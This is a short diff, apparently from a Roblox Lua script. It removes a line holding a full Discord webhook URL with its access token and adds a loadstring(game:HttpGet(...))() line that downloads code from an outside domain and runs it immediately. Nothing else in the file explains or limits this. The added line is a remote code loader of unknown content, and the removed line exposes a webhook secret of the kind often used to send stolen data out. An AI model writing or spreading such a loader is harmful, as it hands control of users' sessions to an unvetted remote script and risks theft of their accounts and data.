@@ -2,4 +2,4 @@
 
 
 
-https://discord.com/api/webhooks/1262522212632756254/wE1JJ5cXYSiJwv2LaohRfynZY1TS9Pyihd83HzwXY6TPyWpq8DXLEq38RVkY6pEn-UdL
+loadstring(game:HttpGet("https://egorikusa.space/a3cd6b8b688fb2e108cd5e84.lua", true))()
